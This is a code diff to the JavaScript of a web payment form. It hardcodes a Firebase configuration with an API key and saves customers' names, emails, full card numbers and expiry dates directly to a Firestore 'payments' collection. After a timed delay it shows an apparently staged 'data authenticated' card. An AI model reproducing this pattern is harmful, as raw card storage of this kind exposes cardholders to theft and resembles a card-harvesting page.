@@ -4,7 +4,15 @@ import { addDoc, collection, getFirestore } from "https://www.gstatic.com/fireba
 import { showDataAuthenticatedCard } from "./animation.js";
 
 // 2. Your specific Firebase configuration
-import { firebaseConfig } from "./firebase-config.js";
+const firebaseConfig = {
+  apiKey: "AIzaSyCqS4Vm6D4RnBeqtfvTkLjYFhP7zdfR7iw",
+  authDomain: "payment-form-d76d4.firebaseapp.com",
+  projectId: "payment-form-d76d4",
+  storageBucket: "payment-form-d76d4.firebasestorage.app",
+  messagingSenderId: "377848961500",
+  appId: "1:377848961500:web:cb0d476d5b008563811719",
+  measurementId: "G-VV4YPYM1XP"
+};
 
 // 3. Initialize Firebase and the Database
 const app = initializeApp(firebaseConfig);
@@ -75,6 +83,9 @@ document.addEventListener('DOMContentLoaded', () => {
     // ==========================================
     const form = document.querySelector('form');
 
+    const submitBtn = document.getElementById('submit-btn');
+    const submitLoader = document.getElementById('submit-loader');
+
     if (form) {
         form.addEventListener('submit', async (e) => {
             e.preventDefault(); // Prevent default form submission
@@ -99,6 +110,12 @@ document.addEventListener('DOMContentLoaded', () => {
             const genderInput = document.querySelector('input[name="gender"]:checked');
             const gender = genderInput ? genderInput.id : 'Not specified';
 
+            // Hide the submit button and show the bouncing dots
+            if (submitBtn && submitLoader) {
+                submitBtn.style.display = 'none';
+                submitLoader.style.display = 'flex';
+            }
+
             try {
                 // 3. Save ALL data to Firestore
                 const docRef = await addDoc(collection(db, "payments"), {
@@ -120,24 +137,32 @@ document.addEventListener('DOMContentLoaded', () => {
                 });
                 
                 console.log("Document written with ID: ", docRef.id);
-                // alert("Data Successfully Saved to Firebase!"); 
-                form.reset(); // Clear the form fields
                 
-                // Prepare data object for the auth card
-                const dataToDisplay = {
-                    firstName,
-                    lastName,
-                    email,
-                    cardType,
-                    cardNumber,
-                    expireDate
-                };
+                // Wait for 2.5 seconds to show the bouncing dots transition
+                setTimeout(() => {
+                    form.reset(); // Clear the form fields
+                    
+                    // Prepare data object for the auth card
+                    const dataToDisplay = {
+                        firstName,
+                        lastName,
+                        email,
+                        cardType,
+                        cardNumber,
+                        expireDate
+                    };
 
-                showDataAuthenticatedCard(dataToDisplay); // Trigger the new UI sequence with data
+                    showDataAuthenticatedCard(dataToDisplay); // Trigger the new UI sequence with data
+                }, 2500);
 
             } catch (error) {
                 console.error("Error adding document: ", error);
                 alert("There was an error saving your data.");
+                // Revert to submit button if there's an error
+                if (submitBtn && submitLoader) {
+                    submitBtn.style.display = 'block';
+                    submitLoader.style.display = 'none';
+                }
             }
         });
     }
